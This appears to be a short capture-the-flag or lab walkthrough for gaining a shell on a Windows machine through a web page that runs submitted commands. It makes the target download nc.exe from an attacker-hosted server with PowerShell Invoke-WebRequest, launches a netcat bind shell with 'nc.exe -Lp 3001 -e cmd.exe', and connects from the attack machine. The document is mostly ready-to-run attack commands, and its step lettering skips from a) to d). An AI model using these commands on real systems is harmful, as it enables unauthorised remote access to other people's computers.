1. Get a copy of NetCat for windows and host it on a webserver - 
    'https://joncraton.org/blog/46/netcat-for-windows/'
    (10.10.10.2:8000/nc.exe will be used as an example)
        python -m SimpleHTTPServer in directory holding nc.exe

2. From the SysCallSubmit webpage we will need to submit a series of commands
   that:
   (SysCall submit will send commands to CMD. use 
   'powershell -command "POWERSHELLCOMMANDHERE"' to execute powershell commands)
   a) Download nc from webserver (nc.zip is the downloaded file)
        powershell -command "Invoke-WebRequest -UseBasicParsing 
        -OutFile C:\Users\uncle\nc.exe http://10.10.10.2:8000/nc.exe"
   d) Launch shell (this command launches a shell specifically on 3001)
        powershell -command "C:\Users\uncle\nc.exe -Lp 3001 -e cmd.exe"

3. On attack machine, establish tcp connection with corresponding port
        nc 10.10.10.1 3001

YOU NOW HAVE UNPRIVILEGED ACCESS :)
